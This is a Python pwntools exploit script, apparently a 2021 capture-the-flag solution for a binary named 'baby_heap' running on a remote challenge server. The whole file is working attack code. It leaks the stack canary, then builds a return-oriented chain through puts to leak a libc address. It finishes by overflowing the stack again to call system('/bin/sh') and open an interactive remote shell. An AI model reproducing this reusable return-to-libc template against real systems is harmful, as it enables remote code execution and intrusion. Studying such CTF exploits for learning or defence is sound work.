# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from LibcSearcher import LibcSearcher
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './baby_heap'
elf = ELF(binary)
#libc = elf.libc
libc = ELF('./libc-2.31.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'hzserver.bi0x.cn'
    port = '9212'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('select:',num)

one_gad = one_gadget(libc.path)
pop_rdi_ret = 0x00000000004017e3
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
rua_addr = 0x0000000004014CC
ret = 0x000000000040101a

#dbg("printf")
sa("\n","11451419198")
ru("11451419198")
canary =  u64(p.recv(7).rjust(8,"\x00"))

lg("canary",canary)
cmd(1)
sla("buy?",8)

for i in range(8):
    cmd(2)
cmd(3)
sl("114")
cmd("114514")
sla("2.escape",2)

payload = "a"*0x78 + p64(canary)  + "a"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(rua_addr)

sla("ice:",payload)
puts_addr = l64()

lg("puts_addr",puts_addr)


libc.address = puts_addr - libc.sym["puts"]
system = libc.sym["system"]
binsh = libc.search("/bin/sh").next()

payload = "a"*0x78 + p64(canary)  + "a"*8 + p64(ret) +p64(pop_rdi_ret) + p64(binsh) + p64(system)

sla("2.escape",2)
sla("ice:",payload)

p.interactive()

'''
@File    :   baby_heap.py
@Time    :   2021/08/17 13:45:36
@Author  :   Niyah 
'''